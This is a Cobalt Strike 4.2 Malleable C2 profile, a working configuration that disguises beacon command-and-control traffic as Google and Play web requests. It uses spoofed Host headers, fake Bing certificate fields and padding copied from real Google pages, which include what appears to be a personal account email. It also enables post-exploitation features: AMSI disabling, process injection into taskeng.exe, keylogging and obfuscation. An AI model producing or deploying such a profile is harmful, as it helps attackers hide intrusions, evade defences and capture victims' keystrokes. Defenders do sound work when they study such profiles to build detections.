## Cobalt Strike Malleable C2 Profile
## Version: Cobalt Strike 4.2
## Date   : 2022-01-13 09:12:58

## Profile Name
##set sample_name "CobaltStrike Beacon";

## Sleep Times
set sleeptime "34000";
set jitter    "18";

## Beacon maxdns
set maxdns    "241";

## DNS servers
set dns_idle "114.114.115.115";

## Beacon User-Agent
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931";

## Self-signed SSL Certificates with SSL Beacon
## Stager
https-certificate {

    set C   "DM";
    set CN  "www.bing.com";
    set O   "bing.com";
    set OU  "bing.com";
    set validity "365";
}


##Code Signing Certificate
#code-signer {
#    set keystore "keystore.jks";
#    set password "123456";
#    set alias    "google";
#}

## Staging process
set host_stage "false";

http-stager {
    set uri_x86 "/api/customization/favicon";
    set uri_x64 "/api/customizationer/favicons";

    server {
        header "Content-Type" "text/html; charset=utf-8";
        header "Server" "ESF";
        header "Cross-Origin-Opener-Policy" "same-origin; report-to=\"OneGoogleWidgetUi\"";
	header "x-ua-compatible" "IE=edge";
	header "Content-Security-Policy" "require-trusted-types-for 'script';report-uri /_/OneGoogleWidgetUi/cspreport";
	header "Connection" "close";
        output {
            prepend "a=\"deferred-i2\" data-p=\"%.@.]\" jscontroller=\"aDfbSd\" jsaction=\"rcuQ6b:npT2md;\" data-node-index=\"1;0\" jsmodel=\"hc6Ubd\" c-wiz><style nonce=\"IlympEMWBwOEMaKxWMkDUQ\">.MrEfLc {background-image: url('https://ssl.gstatic.com/gb/images/p1_4d827a84.png'); background-size: 64px 3100px;}@media (min-resolution: 144dpi), (-webkit-min-device-pixel-ratio: 1.5) {.MrEfLc {background-image: url('https://ssl.gstatic.com/gb/images/p2_772b9c3b.png');}}</style><div class=\"qWuU9c\" data-ogmv><div class=\"EHzcec eejsDc mIM26c\" jsname=\"Sx9Kwc\" jsaction=\"kav0L:npT2md(preventDefault=true);qRPDvb:kvzNsb;UOCPhc:FybyJc;agoMJf:CfS0pe;UT22ib:Hp74Ud;GJ7MT:rfjeo;\" aria-label=\"Google 应用\"><div class=\"VUoKZ\" aria-hidden=\"true\"><div class=\"TRHLAc\"></div></div><ul jsname=\"k77Iif\" class=\"LVal7b u4RcUd\"><li class=\"j1ei8c\" jscontroller=\"lKZxSd\" jsaction=\"rcuQ6b:npT2md; keydown:I481le;qUuEUd:rfjeo;j9grLe:Z8TOLc;HUObcd:Hp74Ud;\"><a class=\"tX9u1b\" href=\"https://myaccount.google.com/?utm_source=OGB&amp;tab=rk&amp;utm_medium=app\" target=\"_top\" data-pid=\"192\" jslog=\"46976; 1:192; track:click; index:0\" jsname=\"hSRGPd\" aria-grabbed=\"false\" draggable=\"false\"><div class=\"pPU";
            prepend "<!doctype html><html lang=\"zh\" dir=\"ltr\"><head><base href=\"https://ogs.google.com/u/0/\"><meta name=\"referrer\" content=\"origin\"><link rel=\"canonical\" href=\"https://ogs.google.com/widget/app\"><link rel=\"preconnect\" href=\"https://www.gstatic.com\"><link rel=\"preconnect\" href=\"https://ssl.gstatic.com\"><script data-id=\"_gd\" nonce=\"XkS8U6Qcrec7oKKaFQeKZg\">window.WIZ_global_data = {\"DpimGf\":false,\"EP1ykd\":[\"/_/*\"],\"FdrFJe\":\"7099865732103475799\",\"Im6cmf\":\"/u/0/_/OneGoogleWidgetUi\",\"LVIXXb\":1,\"LoQv7e\":true,\"MT7f9b\":[],\"NrSucd\":false,\"OwAJ6e\":false,\"QrtxK\":\"0\",\"S06Grb\":\"114223667106756397229\",\"SNlM0e\":\"AJWxFIFn61t1dwx7z8DU5e-UlYQw:1641962309378\",\"W3Yyqf\":\"114223667106756397229\",\"WZsZ1e\":\"Lc67ogi_bRSNdr8X/AFX6Krw9cRNij1Jtq\",\"Yllh3e\":\"%.@.1641962309368673,8700433,2264993291]\",\"ZwjLXe\":243,\"cfb2h\":\"boq_onegooglehttpserver_20220103.04_p0\",\"eptZe\":\"/u/0/_/OneGoogleWidgetUi/\",\"fPDxwd\":[1763433,1772879,45814370],\"gGcLoe\":false,\"ikfjnc\":[\"chrome-untrusted://new-tab-page\",\"chrome://new-tab-page\"],\"nQyAE\":{\"tBSlob\":\"false\"},\"oPEP7c\":\"toto25song@gmail.com\",\"qDCSke\":\"114223667106756397229\",\"qwAQke\":\"OneGoogleWidgetUi\",\"rtQCxc\":-480,\"w2btAe\":\"%.@.\\\"114223667106756397229\\\",\\\"114223667106756397229\\\",\\\"0\\\",true,null,null,true,false]\",\"zChJod\":\"%.@.]\"};</script><script nonce=\"XkS8U6Qcrec7oKKaFQeKZg\">(function(){/* Copyright The Closure Library Authors. SPDX-License-Identifier: Apache-2.0*/'use strict';var a=window,d=a.performance,l=k();a.cc_latency_start_time=d&&d.now?0:d&&d.timing&&d.timing.navigationStart?d.timing.navigationStart:l;function k(){return d&&d.now?d.now():(new Date).getTime()}function n(f){if(d&&d.now&&d.mark){var h=d.mark(f);if(h)return h.startTime;if(d.getEntriesByName&&(f=d.getEntriesByName(f).pop()))return f.startTime}return k()}a.onaft=function(){n(\"aft\")};a._isLazyImage=function(f){return f.hasAttribute(\"data-src\")||f.hasAttribute(\"data-ils\")||\"lazy\"===f.getAttribute(\"loading\")};a.l=function(f){function h(b){var c={};c[b]=k();a.cc_latency.push(c)}function m(b){var c=n(\"iml\");b.setAttribute(\"data-iml\",c);return c}a.cc_aid=f;a.iml_start=a.cc_latency_start_time;a.css_size=0;a.cc_latency=[];a.ccTick=h;a.onJsLoad=function(){h(\"jsl\")};a.onCssLoad=function(){h(\"cssl\")};a._isVisible=function(b,c,g){g=void 0===g?!1:g;if(!c||\"none\"==c.style.display)return!1;var e=b.defaultView;if(e&&e.getComputedStyle&&(e=e.getComputedStyle(c),\"0px\"==e.height||\"0px\"==e.width||\"hidden\"==e.visibility&&!g))return!1;if(!c.getBoundingClientRect)return!0;e=c.getBoundingClientRect();c=e.left+a.pageXOffset;g=e.top+a.pageYOffset;if(0>g+e.height||0>c+e.width||0>=e.height||0>=e.width)return!1;b=b.documentElement;return g<=(a.innerHeight||b.clientHeight)&&c<=(a.innerWidth||b.clientWidth)};a._recordImlEl=m;document.documentElement.addEventListener(\"load\",function(b){b=b.target;var c;\"IMG\"!=b.tagName||b.hasAttribute(\"data-iid\")||a._isLazyImage(b)||b.hasAttribute(\"data-noaft\")||(c=m(b));if(a.aft_counter&&(b=a.aft_counter.indexOf(b),-1!==b&&(b=1===a.aft_counter.splice(b,1).length,0===a.aft_counter.length&&b&&c)))a.onaft(c)},!0);a.prt=-1;a.wiz_tick=function(){var b=n(\"prt\");a.prt=b}};}).call(this);l('qBzSPd')</script><script nonce=\"XkS8U6Qcrec7oKKaFQeKZg\">var _F_cssRowKey = 'boq-one-google.OneGoogleWidgetUi.XJ6jkHIgzKU.L.B1.O';var _F_combinedSignature = 'AM-SdHt7YFH_OY54RAZNytCIki7ZplCEyg';function _DumpException(e) {throw e;}</script><style data-href=\"https://www.gstatic.com/_/mss/boq-one-google/_/ss/k=boq-one-google.OneGoogleWidgetUi.XJ6jkHIgzKU.L.B1.O/am=fAAAEA/d=1/ed=1";
            append " -207px\",\"https://play.google.com/?hl\\u003dzh-CN\\u0026tab\\u003dr8\",\"\",null,null,\"\"],[426,\"新闻\",\"0 -1311px\",\"https://news.google.com/?tab\\u003drn\",\"\",null,null,\"\"],[23,\"Gmail\",\"0 -2001px\",\"https://mail.google.com/mail/?tab\\u003drm\",\"\",null,null,\"\"],[411,\"Meet\",\"0 -690px\",\"https://meet.google.com?hs\\u003d197\\u0026pli\\u003d1\\u0026authuser\\u003d0\",\"\",null,null,\"\"],[385,\"Chat\",\"0 -1656px\",\"https://chat.google.com/\",\"\",null,null,\"\"],[53,\"通讯录\",\"0 -2898px\",\"https://contacts.google.com/?hl\\u003dzh-CN\\u0026tab\\u003drC\",\"\",null,null,\"\"],[49,\"云端硬盘\",\"0 -2967px\",\"https://drive.google.com/?tab\\u003dro\\u0026authuser\\u003d0\",\"\",null,null,\"\"],[24,\"日历\",\"0 -2553px\",\"https://calendar.google.com/calendar?tab\\u003drc\",\"\",null,null,\"\"],[51,\"翻译\",\"0 -1932px\",\"https://translate.google.com.hk/?hl\\u003dzh-CN\\u0026tab\\u003drT\",\"\",null,null,\"\"],[31,\"相册\",\"0 -2829px\",\"https://photos.google.com/?tab\\u003drq\\u0026pageId\\u003dnone\",\"\",null,null,\"\"],[461,\"Duo\",\"0 -2484px\",\"https://duo.google.com/?usp\\u003dduo_ald\",\"\",null,null,\"\"]],[[27,\"财经\",\"0 -345px\",\"https://www.google.com/finance?tab\\u003dre\",\"\",null,null,\"\"],[25,\"文档\",\"0 -1242px\",\"https://docs.google.com/document/?usp\\u003ddocs_alc\\u0026authuser\\u003d0\",\"\",null,null,\"\"],[283,\"表格\",\"0 -2208px\",\"https://docs.google.com/spreadsheets/?usp\\u003dsheets_alc\\u0026authuser\\u003d0\",\"\",null,null,\"\"],[281,\"幻灯片\",\"0 -2277px\",\"https://docs.google.com/presentation/?usp\\u003dslides_alc\\u0026authuser\\u003d0\",\"\",null,null,\"\"],[10,\"图书\",\"0 -2760px\",\"https://books.google.com.hk/?hl\\u003dzh-CN\\u0026tab\\u003drp\",\"\",null,null,\"\"],[30,\"Blogger\",\"0 -1863px\",\"https://www.blogger.com/?tab\\u003drj\",\"\",null,null,\"\"],[300,\"环聊\",\"0 -2415px\",\"https://hangouts.google.com/\",\"\",null,null,\"\"],[136,\"Keep\",\"0 -276px\",\"https://keep.google.com/u/0\",\"\",null,null,\"\"],[357,\"Jamboard\",\"0 -2070px\",\"https://jamboard.google.com/?authuser\\u003d0\\u0026usp\\u003djam_ald\",\"\",null,null,\"\"],[265,\"课堂\",\"0 -966px\",\"https://classroom.google.com/?authuser\\u003d0\",\"\",null,null,\"\"],[429,\"Google 地球\",\"0 -1380px\",\"https://earth.google.com/web/\",\"\",null,null,\"\"],[338,\"收藏\",\"0 -621px\",\"https://www.google.com.hk/save\",\"\",null,null,\"\"],[264,\"艺术与文化\",\"0 -1518px\",\"https://artsandculture.google.com/?hl\\u003dzh-CN\\u0026utm_source\\u003dogs.google.com\\u0026utm_medium\\u003dreferral\\u0026authuser\\u003d0\",\"\",null,null,\"\"],[304,\"Google Ads\",\"0 -414px\",\"https://ads.google.com/home/?subid\\u003dww-ww-et-g-aw-a-vasquette_ads_cons_1!o2\",\"\",null,null,\"\"],[475,\"Google 播客\",\"0 -552px\",\"https://podcasts.google.com/\",\"\",null,null,\"\"],[459,\"Google One\",\"0 -2691px\",\"https://one.google.com/\",\"\",null,null,\"\"],[405,\"差旅\",\"0 -3036px\",\"https://www.google.com/travel/?dest_src\\u003dal\",\"\",null,null,\"\"],[330,\"表单\",\"0 -2139px\",\"https://docs.google.com/forms/?authuser\\u003d0\\u0026usp\\u003dforms_alc\",\"\",null,null,\"\"]],null,\"https://workspace.google.com/marketplace?pann\\u003dogb\",\"来自 Google Workspace Marketplace 的更多应用\",\"https://www.google.com.hk/intl/zh-CN/about/products?tab\\u003drh\",null,null,null,null,\"https://ssl.gstatic.com/gb/images/p2_772b9c3b.png\",\"64px 3100px\",true,false,\"https://ssl.gstatic.com/gb/images/p1_4d827a84.png\",\"\",\"更多 Google 应用/产品\",null,false]], sideChannel: {}});</script><script id=\"wiz_jd\" nonce=\"XkS8U6Qcrec7oKKaFQeKZg\">if (window['_wjdc']) {const wjd = {}; window['_wjdc'](wjd); delete window['_wjdc'];}</script><script aria-hidden=\"true\" nonce=\"XkS8U6Qcrec7oKKaFQeKZg\">window.wiz_progress&&window.wiz_progress(); window.stopScanForCss&&window.stopScanForCss(); ccTick('bl');</script></body></html>";
            print;

        }
    }

    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
    }
}

## SSH beacons
##Note that the format is word_##, where CS will auto include a two digit number in the "##" field.
set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
set ssh_pipename "SearchText_##";

##http-config
http-config {
    set headers "Date,Server, Content-Length, Keep-Alive,Connection, Content-Type";
    header "Server" "Apache";
    header "Keep-Alive" "timeout=10, max=100";
    header "Connection" "Keep-Alive";

    #This option decides if Cobalt Strike uses the X-Forwarded-For HTTP header to determine the remote address of a request.
    #Use this option if your Cobalt Strike server is behind an HTTP redirector.
    set trust_x_forwarded_for "true";
}

## Post Exploitation
post-ex {
    set spawnto_x86 "%windir%\\syswow64\\taskeng.exe";
    set spawnto_x64 "%windir%\\sysnative\\taskeng.exe";
    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "true";
    set pipename "samr_##";
    set keylogger "GetAsyncKeyState";
    #set thread_hint ""; # specify as module!function+0x##
}

## HTTP GET
http-get {

    set uri "/async/newtab_ogb";

    client {

        header "Accept-Encoding" "gzip, deflate";
        header "Connection" "close";
	header "X-Client-Data" "CJe2yQEIpbbJAQjBtskBCKmdygEIrt7KAQjq8ssBCJ75ywEI1/zLAQjmhMwBCLaFzAEIy4nMAQisjswBCOaOzAEI0o/MAQjakMwBGIyeywE=";
        header "Host" "www.google.com";

        metadata {
            base64url;
            prepend "ANID=";
            prepend "__Secure-3PAPISID=noskin;";
            append "CONSENT=YES+CN.zh-CN+20210917-09-0";
            header "Cookie";
        }
    }

    server {

        header "Server" "gws";
        header "Content-Type" "application/json; charset=UTF-8";
        header "Content-Disposition" "attachment; filename=\"f.txt\"";
	header "Version" "420312181";
	header "X-XSS-Protection" "0";
	header "BFCache-Opt-In" "unload";
	header "Content-Length" "165846";
	header "Expires" "Wed, 12 Jan 2022 04:38:22 GMT";

        output {
            mask;
            prepend "_.U(e,\\\"gb_ya\\\",!f);f\\u0026\\u0026Hi(a,a.O)}a.j\\u0026\\u0026(a.j.isVisible(\\\"menu\\\")||a.j.isVisible(\\\"back\\\"))\\u0026\\u0026!mi(a.j)\\u0026\\u0026(a.Ga\\u003da.j.Eb());e\\u003d_.rg(ai);_.ue(a.A,e);_.O(a.A,b);if(a.ka\\u0026\\u0026null!\\u003da.G)if(\\\"gb_Ec\\\"!\\u003db)_.T(a.G,\\\"min-width\\\",\\\"\\\"),_.T(a.D,\\\"min-width\\\",\\\"\\\");else{f\\u003d_.Mg(a.G).width;var g\\u003d_.Mg(a.D).width;f\\u003dMath.max(f,g);_.T(a.G,\\\"min-width\\\",f+\\\"px\\\");_.T(a.D,\\\"min-width\\\",f+\\\"px\\\")}c?a.V||(a.V\\u003d!0,Ki(a,a.V)):(a.V\\u003d!1,a.te());null!\\u003da.F\\u0026\\u0026(_.U(a.F,\\\"gb_Ce\\\",!c\\u0026\\u0026!d),_.U(a.F,\\\"gb_Be\\\",c||d));\\na.j\\u0026\\u0026(c\\u003da.j.j,_.ue(c,e),_.O(c,b),mi(a.j)?_.L(\\\"gb_Zd\\\",void 0).appendChild(c):a.A.appendChild(c),a.j.isVisible(\\\"menu\\\")||a.j.isVisible(\\\"back\\\"))\\u0026\\u0026(b\\u003d!mi(a.j),c\\u003da.j.Eb(),b\\u0026\\u0026!c\\u0026\\u0026a.Ga?a.j.open():!b\\u0026\\u0026c\\u0026\\u0026a.j.close());Qi(a)},Hi\\u003dfunction(a,b){var c\\u003d_.L(\\\"gb_rc\\\",a.H.J());_.U(c,\\\"gb_ya\\\",!b);a\\u003d_.L(\\\"gb_Wd\\\",a.H.J());null!\\u003da\\u0026\\u0026_.U(a,\\\"gb_be\\\",!b)},Ci\\u003dfunction(a,b,c){var d\\u003d320,e\\u003d_.Ca(_.D(a.o,29),0);0\\u003ce\\u0026\\u0026(d\\u003de);e\\u003dd+2*Math.max(b,c);b\\u003dd+b+c;return e!\\u003db\\u0026\\u0026a.ka?[{id:1,max:b},{id:2,max:e},{id:3}]:[{id:1,max:b},{id:3}]},Ai\\u003dfunction(a,\\nb){if(a\\u003d_.L(b?\\\"gb_ie\\\":\\\"gb_je\\\",a.A)){var c\\u003da.offsetWidth;_.kb(a.children,function(d){_.M(d,\\\"gb_ya\\\")\\u0026\\u0026(c-\\u003dd.offsetWidth)});return c}return 0},R";
            prepend ")]}'{\"update\":{\"language_code\":\"zh-Hans-HK\",\"ogb\":{\"html\":{\"private_do_not_access_or_else_safe_html_wrapped_value\":\"\\u003cheader class\\u003d\\\"gb_na gb_Ta gb_Je\\\" id\\u003d\\\"gb\\\" role\\u003d\\\"banner\\\" style\\u003d\\\"background-color:transparent\\\"\\u003e\\u003cdiv class\\u003d\\\"gb_Zd\\\"\\u003e\\u003c\\/div\\u003e\\u003cdiv class\\u003d\\\"gb_Dd gb_Ud gb_Kd gb_Jd\\\"\\u003e\\u003cdiv class\\u003d\\\"gb_Cd gb_Uc\\\"\\u003e\\u003cdiv class\\u003d\\\"gb_sc gb_ya\\\" aria-expanded\\u003d\\\"false\\\" aria-label\\u003d\\\"主菜单\\\" role\\u003d\\\"button\\\" tabindex\\u003d\\\"0\\\"\\u003e\\u003csvg focusable\\u003d\\\"false\\\" viewbox\\u003d\\\"0 0 24 24\\\"\\u003e\\u003cpath d\\u003d\\\"M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z\\\"\\u003e\\u003c\\/path\\u003e\\u003c\\/svg\\u003e\\u003c\\/div\\u003e\\u003cdiv class\\u003d\\\"gb_sc gb_vc gb_ya\\\" aria-label\\u003d\\\"返回\\\" role\\u003d\\\"button\\\" tabindex\\u003d\\\"0\\\"\\u003e\\u003csvg focusable\\u003d\\\"false\\\" viewbox\\u003d\\\"0 0 24 24\\\"\\u003e\\u003cpath d\\u003d\\\"M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z\\\"\\u003e\\u003c\\/path\\u003e\\u003c\\/svg\\u003e\\u003c\\/div\\u003e\\u003cdiv class\\u003d\\\"gb_sc gb_wc gb_ya\\\" aria-label\\u003d\\\"关闭\\\" role\\u003d\\\"button\\\" tabindex\\u003d\\\"0\\\"\\u003e\\u003csvg viewbox\\u003d\\\"0 0 24 24\\\"\\u003e\\u003cpath d\\u003d\\\"M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z\\\"\\u003e\\u003c\\/path\\u003e\\u003c\\/svg\\u003e\\u003c\\/div\\u003e\\u003cdiv class\\u003d\\\"gb_lc gb_ya\\\"\\u003e\\u003cdiv class\\u003d\\\"gb_mc\\\"\\u003e\\u003ca class\\u003d\\\"gb_ce gb_nc\\\" aria-label\\u003d\\\"Google\\\" href\\u003d\\\"/?tab\\u003drr\\\"\\u003e\\u003cspan class\\u003d\\\"gb_rc gb_9d\\\" aria-hidden\\u003d\\\"true\\\"\\u003e\\u003c\\/span\\u003e\\u003c\\/a\\u003e\\u003c\\/div\\u003e\\u003c\\/div\\u003e\\u003cdiv class\\u003d\\\"gb_Cd gb_Sc gb_Tc\\\"\\u003e\\u003cspan class\\u003d\\\"gb_Wc\\\" aria-level\\u003d\\\"1\\\" role\\u003d\\\"heading\\\"\\u003e \\u003c\\/span\\u003e\\u003c\\/div\\u003e\\u003c\\/div\\u003e\\u003cdiv class\\u003d\\\"gb_Cd gb_Nd gb_Jd gb_Fe\\\"\\u003e\\u003c\\/div\\u003e\\u003cdiv class\\u003d\\\"gb_Od gb_Qa gb_Cd\\\" data-ogsr-up\\u003d\\\"\\\"\\u003e\\u003cdiv\\u003e\\u003cdiv class\\u003d\\\"gb_0d gb_f gb_eg gb_5f\\\" data-ogbl\\u003d\\\"\\\"\\u003e\\u003cdiv class\\u003d\\\"gb_e gb_f\\\"\\u003e\\u003ca class\\u003d\\\"gb_d\\\" data-pid\\u003d\\\"23\\\" href\\u003d\\\"https://mail.google.com/mail/?tab\\u003drm\\u0026amp;ogbl\\\" target\\u003d\\\"_top\\\"\\u003eGmail\\u003c\\/a\\u003e\\u003c\\/div\\u003e\\u003cdiv class\\u003d\\\"gb_e gb_f\\\"\\u003e\\u003ca class\\u003d\\\"gb_d\\\" data-pid\\u003d\\\"2\\\" href\\u003d\\\"https://www.google.com.hk/imghp?hl\\u003dzh-CN\\u0026amp;tab\\u003dri\\u0026amp;ogbl\\\" target\\u003d\\\"_top\\\"\\u003e图片\\u003c\\/a\\u003e\\u003c\\/div\\u003e\\u003c\\/div\\u003e\\u003c\\/div\\u003e\\u003cdiv class\\u003d\\\"gb_Ke\\\"\\u003e\\u003cdiv class\\u003d\\\"gb_Lc\\\"\\u003e\\u003cdiv class\\u003d\\\"gb_z gb_9c gb_f gb_sf\\\" data-ogsr-fb\\u003d\\\"true\\\" data-ogsr-alt\\u003d\\\"\\\" id\\u003d\\\"gbwa\\\"\\u003e\\u003cdiv class\\u003d\\\"gb_rf\\\"\\u003e\\u003ca class\\u003d\\\"gb_A\\\" aria-label\\u003d\\\"Google 应用\\\" href\\u003d\\\"https://www.google.com.hk/intl/zh-CN/about/products?tab\\u003drh\\\" aria-expanded\\u003d\\\"false\\\" role\\u003d\\\"button\\\" tabindex\\u003d\\\"0\\\"\\u003e\\u003csvg class\\u003d\\\"gb_Ne\\\" focusable\\u003d\\\"false\\\" viewbox\\u003d\\\"0 0 24 24\\\"\\u003e\\u003cpath d\\u003d\\\"M6,8c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM12,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM6,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM6,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM12,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM16,6c0,1.1 0.9,2 2,2s2,-0.9 2,-2 -0.9,-2 -2,-2 -2,0.9 -2,2zM12,8c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM18,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM18,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2z\\\"\\u003e";
            append "-right:0}.gb_Le{background:#f1f3f4;border:1px solid transparent;-webkit-border-radius:8px;border-radius:8px;margin-left:auto;margin-right:auto;max-width:720px;position:relative;-webkit-transition:background 100ms ease-in,width 100ms ease-out;transition:background 100ms ease-in,width 100ms ease-out}.gb_Le.gb_ef{-webkit-border-radius:8px 8px 0 0;border-radius:8px 8px 0 0}.gb_tc .gb_Le{background:rgba(241,243,244,0.24)}.gb_Le button{background:none;border:none;cursor:pointer;outline:none;padding:0 5px;line-height:0}.gb_Le:not(.gb_we) button{padding:0 5px}.gb_Le button svg,.gb_Le button img{padding:8px;margin:3px}.gb_Le.gb_we button svg{margin-left:1px;margin-right:1px}.gb_ff.gb_gf,.gb_hf.gb_gf{padding-left:2px;padding-right:2px}.gb_hf{display:none}.gb_ff,.gb_hf{float:left;position:absolute;top:0}.gb_if{position:absolute;right:0;cursor:default;visibility:hidden;top:0;-webkit-transition:opacity 250ms ease-out;transition:opacity 250ms ease-out}.gb_jf .gb_if{right:44px}.gb_if.gb_kf{visibility:inherit}.gb_6e::-ms-clear{display:none;height:0;width:0}.gb_lf{position:absolute;right:0;top:0}.gb_mf{height:46px;padding:0;margin-left:56px;margin-right:49px;overflow:hidden}.gb_jf .gb_mf{margin-right:96px}.gb_6e{background:transparent;border:none;font:normal 16px Google Sans,Roboto,RobotoDraft,Helvetica,Arial,sans-serif;-webkit-font-variant-ligatures:none;font-variant-ligatures:none;height:46px;outline:none;width:100%;-webkit-box-sizing:border-box;box-sizing:border-box}.gb_gf.gb_mf .gb_6e.gb_nf{padding-left:2px}.gb_tc .gb_6e{color:rgba(255,255,255,0.87)}.gb_6e:not(.gb_nf){padding:11px 0}.gb_6e.gb_nf{padding:0}.gb_nf{height:46px;line-height:46px}.gb_Le:not(.gb_Me) input::-webkit-input-placeholder{color:rgba(0,0,0,0.54)}.gb_tc .gb_Le:not(.gb_Me) input::-webkit-input-placeholder{color:rgba(255,255,255,0.87)}.gb_Le.gb_we:not(.gb_K){background:transparent;float:right;-webkit-box-shadow:none;box-shadow:none}.gb_Le.gb_we:not(.gb_K) .gb_mf,.gb_Le.gb_we:not(.gb_K) .gb_if,.gb_Le.gb_we:not(.gb_K) .gb_lf{display:none}.gb_Le.gb_we.gb_K{margin-left:0;position:absolute;width:auto}.gb_Le.gb_we.gb_K .gb_ff{display:none}.gb_Le.gb_we .gb_ff{padding:0;position:static}.gb_Le.gb_we.gb_K .gb_hf{display:block}.gb_na.gb_Ec .gb_Cd.gb_ve:not(.gb_we) .gb_xe,.gb_na.gb_Ec .gb_Cd.gb_ye.gb_ze:not(.gb_we) .gb_xe,.gb_na.gb_Id .gb_Cd:not(.gb_ve):not(.gb_we) .gb_xe{padding-right:30px}.gb_na.gb_Ec .gb_Cd.gb_ze:not(.gb_we) .gb_xe,.gb_na.gb_Ec .gb_Cd.gb_ye.gb_ve:not(.gb_we) .gb_xe{padding-left:30px}.gb_Cd:not(.gb_we) .gb_xe{padding-left:10px;padding-right:10px;width:100%;-webkit-flex:1 1 auto;flex:1 1 auto}.gb_xe.gb_za{display:none}.gb_Nd.gb_Ae\\u003e.gb_he{min-width:initial!important;min-width:auto!important}.gb_Be,.gb_Ce:not(.gb_Jd):not(.gb_Ae).gb_we,.gb_Ce:not(.gb_Jd):not(.gb_Ae).gb_De{-webkit-box-pack:flex-end;-webkit-justify-content:flex-end;justify-content:flex-end}.gb_Ce:not(.gb_Jd):not(.gb_Ae){-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center}.gb_Ce:not(.gb_Jd):not(.gb_Ae):not(.gb_we).gb_Ee,.gb_Ce:not(.gb_Jd):not(.gb_Ae):not(.gb_we).gb_Fe{-webkit-box-pack:flex-start;-webkit-justify-content:flex-start;justify-content:flex-start}.gb_Nd.gb_Jd,.gb_Nd.gb_Ae{-webkit-box-pack:space-between;-webkit-justify-content:space-between;justify-content:space-between}.gb_na.gb_oa .gb_Uc,.gb_Dd.gb_Jd.gb_Kd\\u003e.gb_Uc{-webkit-flex:1 1 auto;flex:1 1 auto;overflow:hidden}.gb_na.gb_oa .gb_Nd,.gb_Dd.gb_Jd.gb_Kd\\u003e.gb_Nd{-webkit-flex:0 0 auto;flex:0 0 auto}sentinel{}\"}},\"page_title_placeholder_label\":\"page-title\",\"product_control_placeholder_label\":[\"product_control-label0\",\"product_control-label1\",\"product_control-label2\"],\"second_row_placeholder_label\":\"second-row\"}}}";
            print;
        }
    }
}

## HTTP POST
http-post {

    set uri "/log";

    client {

        header "Content-Type" "application/x-www-form-urlencoded;charset=UTF-8";
        header "Connection" "close";
	header "X-Goog-AuthUser" "0";
	header "Origin" "https://ogs.google.com";
	header "X-Client-Data" "CJe2yQEIpbbJAQjBtskBCKmdygEInvnLAQjmhMwBCLaFzAEIy4nMAQjSj8wBGIyeywE=";
        header "Host" "play.google.com";

        id {
            base64url;
            parameter "formid";
        }
        parameter "cedit" "KvsEPlQXLRPx";
	parameter "redirect" "dbcOsN";
	parameter "is_shipping_fee" "vLlmKye";
        output {
            base64url;
            prepend "aid=522005705&accver=1&showtype=embed&ua=";
            print;
        }
    }

    server {

        header "Server" "Playlog";
        header "Content-Type" "text/plain; charset=UTF-8";
        header "Cache-Control" "private";
	header "Access-Control-Allow-Headers" "X-Playlog-Web";
	header "Expires" "Wed, 12 Jan 2022 04:38:32 GMT";

        output {
            mask;
            prepend "_STATS\",0],[\"SMART_SETUP\",0],[\"TRON\",0]],-3";
            prepend "[\"-1\",null,[[[\"ANDROID_BACKUP\",0],[\"BATTERY";
            append "334737594024971225],[],{\"175237375\":[10000]}]";
            print;
        }
    }
}